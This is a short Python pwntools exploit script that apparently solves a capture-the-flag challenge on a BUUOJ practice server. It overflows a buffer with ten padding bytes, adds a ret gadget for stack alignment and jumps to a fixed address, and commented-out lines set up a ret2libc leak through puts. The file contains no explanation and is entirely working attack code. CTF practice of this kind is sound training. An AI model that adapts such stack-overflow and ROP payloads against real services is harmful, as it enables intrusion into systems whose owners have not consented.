from pwn import *

#p=process('./1')
p=remote('node3.buuoj.cn',25345)
elf=ELF('./1')
libc=ELF('libc-2.27_64.so')
main=elf.sym['main']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x4009b3
ret=0x0400656
#payload=10*'a'+p64(0x400807)
payload=10*'a'+p64(ret)+p64(0x400807)
p.sendline(payload)

p.interactive()
#puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
#print hex(puts_addr)
